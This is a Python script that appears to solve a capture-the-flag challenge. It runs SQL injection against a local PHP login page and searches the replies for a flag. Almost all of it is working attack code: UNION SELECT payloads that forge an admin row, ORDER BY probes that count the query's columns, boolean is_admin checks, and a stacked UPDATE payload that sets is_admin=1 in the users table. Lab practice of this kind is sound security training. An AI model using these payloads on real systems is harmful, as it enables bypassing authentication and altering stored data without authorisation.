import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[ANALYSIS] The application likely checks a separate 'is_admin' or 'role' field")
print("Need to inject with correct column structure to make is_admin=1 or similar\n")

# First, let's test a baseline request to see the normal response
print("[BASELINE TEST]")
resp = requests.get(target, params={'username': 'test', 'password': 'test'})
print(f"Normal failed login response length: {len(resp.text)} bytes")
print(f"Response preview: {resp.text[:300]}\n")

# The key insight: if there's an is_admin field, we need UNION SELECT to return rows with is_admin=1
# Let's try different structures assuming the query might be:
# SELECT username, password, is_admin FROM users WHERE username='X' AND password='Y'

print("[TARGETED UNION SELECT - Assuming 3-column table with is_admin field]")
print("-"*80)

union_admin_payloads = [
    # Inject with is_admin=1 in third column
    ("' UNION SELECT 'admin','x',1-- -", "x"),
    ("' UNION SELECT 'admin','admin',1-- -", "admin"),
    ("admin' UNION SELECT 'admin','x',1-- -", "x"),
    
    # Try with string 'admin' or 'true' in third column
    ("' UNION SELECT 'admin','x','admin'-- -", "x"),
    ("' UNION SELECT 'admin','x','true'-- -", "x"),
    ("' UNION SELECT 'admin','x','yes'-- -", "x"),
    
    # What if first column is is_admin?
    ("' UNION SELECT 1,'admin','x'-- -", "x"),
    
    # Or maybe there are more columns
    ("' UNION SELECT 'admin','x',1,1-- -", "x"),
    ("' UNION SELECT 'admin','x',1,1,1-- -", "x"),
    
    # Try without closing the username WHERE clause
    ("' OR 1=1 UNION SELECT 'admin','x',1-- -", "x"),
    
    # Maybe need to match password hash?
    ("' UNION SELECT 'admin',password,1 FROM users WHERE username='admin'-- -", "x"),
]

for user, pwd in union_admin_payloads:
    params = {'username': user, 'password': pwd}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND !!!]")
        print(f"Payload: username={user}, password={pwd}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    response_indicator = "not the admin" if "not the admin" in resp.text.lower() else f"length={len(resp.text)}"
    print(f"[✗] {user[:50]:50s} | {response_indicator}")

# Maybe the query structure is different - let's try ORDER BY to detect columns
print("\n[DETECTING COLUMN COUNT with ORDER BY]")
print("-"*80)

for i in range(1, 10):
    user = f"admin' ORDER BY {i}-- -"
    params = {'username': user, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    if "error" in resp.text.lower() or "unknown" in resp.text.lower():
        print(f"[!] ORDER BY {i} caused error - likely has {i-1} columns")
        break
    else:
        print(f"[✓] ORDER BY {i} works - at least {i} columns")

# Let's also try injecting directly into a potential is_admin check
print("\n[DIRECT ADMIN FIELD MANIPULATION]")
print("-"*80)

direct_payloads = [
    # If query checks is_admin=0
    ("admin' AND 1=1-- -", "x", "Baseline - should fail"),
    ("admin' AND is_admin=1-- -", "x", "Force is_admin=1"),
    ("admin' OR is_admin=1-- -", "x", "OR is_admin=1"),
    ("admin' AND '1'='1' AND is_admin=1-- -", "x", "Complex with is_admin"),
    
    # Update statement injection (risky but might work)
    ("admin'; UPDATE users SET is_admin=1 WHERE username='admin'-- -", "x", "UPDATE injection"),
]

for user, pwd, desc in direct_payloads:
    params = {'username': user, 'password': pwd}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND !!!]")
        print(f"Payload: {desc}")
        print(f"username={user}, password={pwd}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    print(f"[✗] {desc:40s} | {'not admin' if 'not the admin' in resp.text.lower() else 'different response'}")

print("\n[COMPLETE] No flag found with current payloads")

